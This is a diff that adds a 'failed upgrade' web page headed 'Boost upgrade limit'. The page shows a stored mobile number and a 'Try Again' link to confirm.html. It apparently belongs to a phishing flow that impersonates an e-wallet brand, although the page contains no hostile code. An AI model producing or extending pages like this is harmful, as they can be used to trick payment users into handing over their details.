@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>on process</title>
+  <style>
+    body { margin:0; font-family: Arial, sans-serif; background:#f9fafb; text-align:center; }
+    header { background:#ea0029; padding:16px; color:#fff; font-size:18px; font-weight:600; }
+    main { max-width:420px; margin:3rem auto; padding:0 1.5rem; }
+    .status-icon {
+      width:100px; height:100px;
+      margin:0 auto 1rem;
+      border-radius:50%; background:#ef4444;
+      display:flex; align-items:center; justify-content:center;
+    }
+    .status-icon span {
+      font-size:50px; color:#fff;
+    }
+    h1 { font-size:26px; margin:1rem 0; color:#111; }
+    p { color:#444; margin-bottom:2rem; font-size:16px; }
+    .btn { 
+      display:inline-block;
+      padding:12px 20px; 
+      background:#ea0029; 
+      color:#fff; 
+      border:none; 
+      border-radius:6px; 
+      font-size:16px; 
+      text-decoration:none;
+    }
+  </style>
+</head>
+<body>
+
+  <header>Boost upgrade limit</header>
+
+  <main>
+    <div class="status-icon"><span>✖</span></div>
+    <h1>failed upgrade </h1>
+    <p>Unfortunately, your payment could not be processed.</p>
+    <p>Mobile Number: <strong id="phoneDisplay"></strong></p>
+
+    <a href="confirm.html" class="btn">Try Again</a>
+  </main>
+
+<script>
+  // Ambil nomor dari localStorage
+  const phone = localStorage.getItem("boost_phone") || "";
+  document.getElementById("phoneDisplay").textContent = phone || "N/A";
+</script>
+
+</body>
+</html>
